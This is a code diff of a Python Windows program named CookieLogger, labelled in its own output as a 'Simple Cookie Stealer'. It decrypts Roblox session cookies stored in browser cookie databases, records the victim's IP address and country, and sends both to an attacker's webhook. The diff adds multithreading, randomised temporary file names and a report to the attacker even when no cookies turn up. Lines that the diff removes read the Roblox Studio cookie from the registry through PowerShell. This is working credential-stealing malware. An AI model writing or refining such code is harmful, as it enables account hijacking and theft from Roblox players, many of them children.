@@ -7,18 +7,23 @@ import zipfile
 import sqlite3
 import requests
 import subprocess
+import threading
+import traceback
+import random
 
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES 
 
 webhook = "WEBHOOK GOES HERE"
+debug = False # Secret thingy for development (Don't mess with it)
 
 def safe(func):
     def wrapper(*args, **kwargs):
         try:
             return func(*args, **kwargs)
         except Exception:
-            pass
+            if debug:
+                traceback.print_exc()
     return wrapper
 
 class CookieLogger:
@@ -30,8 +35,6 @@ class CookieLogger:
         browsers = self.findBrowsers()
 
         info = requests.get("http://ip-api.com/json/").json()
-        username = info["query"]
-        location = f"{info['city']}, {info['regionName']} ({info['countryCode']})"
 
 
         self.embeds = [{
@@ -41,29 +44,31 @@ class CookieLogger:
             "color": 12422241,
 
             "fields": [
-                {"name": "IP", "value": username, "inline": True},
-                {"name": "Location", "value": location, "inline": True},
+                {"name": "IP", "value": info["query"], "inline": True},
+                {"name": "Area", "value": info["country"], "inline": True},
             ]
         }]
 
-        cookies = []
-        try:
-            studioCookie = subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY", creationflags=0x08000000, shell=True).decode().strip()
-            cookies.append(studioCookie)
-        except Exception:
-            pass
-        
-        for browser in browsers:
-            try:
-                cookies = self.getCookie(browser[0], browser[1])
-                if cookies:
-                    for cookie in cookies:
-                        self.handleEmbed(cookie)
-            except Exception:
-                pass
+        threads = [threading.Thread(target=self.getCookie, args=(browser[0], browser[1])) for browser in browsers]
+
+        for thread in threads:
+            thread.start()
+
+        for thread in threads:
+            thread.join()
     
         if len(self.embeds) == 1:
-            return
+            requests.post(webhook, json={"embeds": [{
+            "username": "Simple Cookie Stealer",
+            "title": "No Cookies Found!",
+            "description" : f"A Victim ran the Stealer, but it did not find any Roblox Cookies.",
+            "color": 12422241,
+
+            "fields": [
+                {"name": "IP", "value": info["query"], "inline": True},
+                {"name": "Location", "value": info["country"], "inline": True},
+            ]
+        }]})
 
         embedsSplit = [self.embeds[idx:idx+10] for idx in range(len(self.embeds)) if idx % 10 == 0]
         for embeds in embedsSplit:
@@ -149,7 +154,7 @@ class CookieLogger:
 
     @safe
     def getCookie(self, browserPath, isProfiled):
-        
+
         cookiesFound = []
 
         profiles = ["Default"]
@@ -164,51 +169,58 @@ class CookieLogger:
                     profiles.append(directory)
         
         if not isProfiled:
-            roblosec = ""
-            cookieJar = ""
             if "Network" in os.listdir(browserPath):
                 cookiePath = os.path.join(browserPath, "Network", "Cookies")
             else:
                 cookiePath = os.path.join(browserPath, "Cookies")
+
+            filename = ''.join([random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(256)]) + '.db' # Random name so there aren't collisions
             
-            shutil.copy2(cookiePath, "temp.db")
-            connection = sqlite3.connect("temp.db")
+            shutil.copy2(cookiePath, filename)
+            connection = sqlite3.connect(filename)
             cursor = connection.cursor()
 
             cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
             for cookie in cursor.fetchall():
                 if cookie[0].endswith("roblox.com") and cookie[2]:
                     decrypted = self.decryptCookie(cookie[2], masterKey)
-                    if (decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")):
-                        cookiesFound.append(decrypted)
+                    try:
+                        if (decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")):
+                            cookiesFound.append(decrypted)
+                    except Exception:
+                        pass
 
             connection.close()
-            os.remove("temp.db")
+            os.remove(filename)
         
         else:
             for profile in profiles:
-                roblosec = ""
-                cookieJar = ""
                 if "Network" in os.listdir(os.path.join(browserPath, profile)):
                     cookiePath = os.path.join(browserPath, profile, "Network", "Cookies")
                 else:
                     cookiePath = os.path.join(browserPath, profile, "Cookies")
 
-                shutil.copy2(cookiePath, "temp.db")
-                connection = sqlite3.connect("temp.db")
+                filename = ''.join([random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(20)]) + '.db' # Random name so there aren't collisions
+
+                shutil.copy2(cookiePath, filename)
+                connection = sqlite3.connect(filename)
                 cursor = connection.cursor()
 
                 cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                 for cookie in cursor.fetchall():
                     if cookie[0].endswith("roblox.com") and cookie[2]:
                         decrypted = self.decryptCookie(cookie[2], masterKey)
-                        if (decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")):
-                            cookiesFound.append(decrypted)
+                        try:
+                            if (decrypted.startswith("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")):
+                                cookiesFound.append(decrypted)
+                        except Exception:
+                            pass
                 
                 connection.close()
-                os.remove("temp.db")
+                os.remove(filename)
 
-        return cookiesFound
+        for cookie in cookiesFound:
+            self.handleEmbed(cookie)
 
 if __name__ == "__main__":
     CookieLogger()
